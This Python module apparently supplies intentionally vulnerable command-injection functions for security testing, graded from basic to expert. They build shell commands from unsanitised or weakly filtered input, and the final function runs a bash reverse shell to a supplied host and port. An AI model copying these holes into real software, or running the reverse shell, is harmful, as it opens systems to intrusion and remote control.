"""
Command Injection Vulnerabilities
This module contains intentionally vulnerable command execution for testing purposes.
"""

import subprocess
import os
from typing import List, Optional


class CommandInjectionVulnerabilities:
    """Class containing command injection vulnerabilities for testing"""
    
    def basic_command_injection_ping(self, host: str) -> str:
        """
        Basic Command Injection - Direct command execution
        Vulnerability Level: Basic
        """
        # VULNERABLE: Direct command execution
        command = f"ping -c 1 {host}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def medium_command_injection_ping(self, host: str) -> str:
        """
        Medium Command Injection - Partial sanitization
        Vulnerability Level: Medium
        """
        # VULNERABLE: Partial sanitization
        host = host.replace(";", "").replace("&", "").replace("|", "")
        command = f"ping -c 1 {host}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def hard_command_injection_ping(self, host: str) -> str:
        """
        Hard Command Injection - Complex injection scenarios
        Vulnerability Level: Hard
        """
        # VULNERABLE: Complex injection with multiple commands
        command = f"ping -c 1 {host} && echo 'Command completed'"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def expert_command_injection_ping(self, host: str) -> str:
        """
        Expert Command Injection - Advanced injection techniques
        Vulnerability Level: Expert
        """
        # VULNERABLE: Advanced injection with file operations
        command = f"ping -c 1 {host} > /tmp/ping_result.txt 2>&1 && cat /tmp/ping_result.txt"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def basic_command_injection_ls(self, directory: str) -> str:
        """
        Basic Command Injection - Directory listing
        Vulnerability Level: Basic
        """
        # VULNERABLE: Direct command execution
        command = f"ls -la {directory}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def medium_command_injection_ls(self, directory: str) -> str:
        """
        Medium Command Injection - Directory listing with sanitization
        Vulnerability Level: Medium
        """
        # VULNERABLE: Weak sanitization
        directory = directory.replace("..", "").replace("~", "")
        command = f"ls -la {directory}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def hard_command_injection_file_operations(self, filename: str) -> str:
        """
        Hard Command Injection - File operations
        Vulnerability Level: Hard
        """
        # VULNERABLE: File operations with injection
        command = f"cat {filename} && echo 'File read completed'"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def expert_command_injection_system_info(self, parameter: str) -> str:
        """
        Expert Command Injection - System information gathering
        Vulnerability Level: Expert
        """
        # VULNERABLE: System information gathering
        command = f"uname -a && whoami && pwd && {parameter}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def basic_command_injection_curl(self, url: str) -> str:
        """
        Basic Command Injection - HTTP requests
        Vulnerability Level: Basic
        """
        # VULNERABLE: Direct command execution
        command = f"curl {url}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def medium_command_injection_curl(self, url: str) -> str:
        """
        Medium Command Injection - HTTP requests with sanitization
        Vulnerability Level: Medium
        """
        # VULNERABLE: Weak URL sanitization
        url = url.replace("`", "").replace("$", "")
        command = f"curl {url}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def hard_command_injection_network_scan(self, target: str) -> str:
        """
        Hard Command Injection - Network scanning
        Vulnerability Level: Hard
        """
        # VULNERABLE: Network scanning with injection
        command = f"nmap -p 80,443,22 {target} && echo 'Scan completed'"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def expert_command_injection_reverse_shell(self, host: str, port: str) -> str:
        """
        Expert Command Injection - Reverse shell attempt
        Vulnerability Level: Expert
        """
        # VULNERABLE: Reverse shell attempt
        command = f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
